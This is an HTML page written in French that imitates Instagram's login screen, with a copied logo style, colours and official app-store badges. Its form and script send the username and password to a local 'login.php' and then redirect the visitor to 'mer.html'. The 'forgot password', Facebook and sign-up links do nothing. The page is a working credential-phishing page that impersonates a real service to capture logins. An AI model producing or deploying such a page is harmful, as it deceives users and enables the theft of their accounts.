<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }
        .login-container {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            width: 350px;
            box-shadow: 0 0 10px rgba(0,0,0,0.05);
        }
        .instagram-logo {
            width: 180px;
            margin: 10px auto 30px;
            display: block;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box;
            font-size: 12px;
        }
        button {
            width: 100%;
            padding: 8px;
            margin: 10px 0;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
        .links {
            margin: 15px 0;
            font-size: 12px;
        }
        .links a {
            color: #00376b;
            text-decoration: none;
            font-size: 12px;
            font-weight: 500;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #8e8e8e;
        }
        .facebook-login {
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo Instagram stylisé (version simplifiée) -->
        <svg class="instagram-logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
            <radialGradient id="gradient" cx="50%" cy="50%" r="70%" fx="50%" fy="50%">
                <stop offset="0%" stop-color="#FFD600"/>
                <stop offset="50%" stop-color="#FF0069"/>
                <stop offset="100%" stop-color="#D300C5"/>
            </radialGradient>
            <rect x="20" y="20" width="160" height="160" rx="40" fill="url(#gradient)"/>
            <rect x="50" y="50" width="100" height="100" rx="20" fill="none" stroke="white" stroke-width="10"/>
            <circle cx="100" cy="75" r="10" fill="white"/>
            <circle cx="140" cy="60" r="5" fill="white"/>
        </svg>
        
       <form action="login.php" method="post" id="loginForm">
            <input type="text" name="username" placeholder="Téléphone, nom d'utilisateur ou e-mail" required>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <button type="submit" id="submit-btn">Se connecter</button>
        </form>
        
        <div class="divider">OU</div>
        
        <a href="#" class="facebook-login">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16" style="vertical-align: middle; margin-right: 5px;">
                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
            </svg>
            Se connecter avec Facebook
        </a>
        
        <div class="links">
            <a href="#" onclick="window.location.reload();">Mot de passe oublié ?</a>
        </div>
    </div>
    
    <div class="login-container" style="margin-top: 10px; padding: 20px;">
        <div style="text-align: center; font-size: 14px;">
            Vous n'avez pas de compte ? <a href="#" style="color: #0095f6; font-weight: bold; text-decoration: none;">Inscrivez-vous</a>
        </div>
    </div>
    
    <div style="text-align: center; margin-top: 20px;">
        <div style="font-size: 14px; color: #8e8e8e;">Téléchargez l'application.</div>
        <div style="margin-top: 15px;">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_francais-fr.png/4b70f6fae447.png" alt="App Store" style="height: 40px; margin-right: 5px;">
            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_francais-fr.png/0badcd7c5e52.png" alt="Google Play" style="height: 40px;">
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Soumettre le formulaire via AJAX pour traiter les identifiants en PHP
            var formData = new FormData(this);
            
            fetch(this.action, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if(response.ok) {
                    window.location.href = 'mer.html';
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
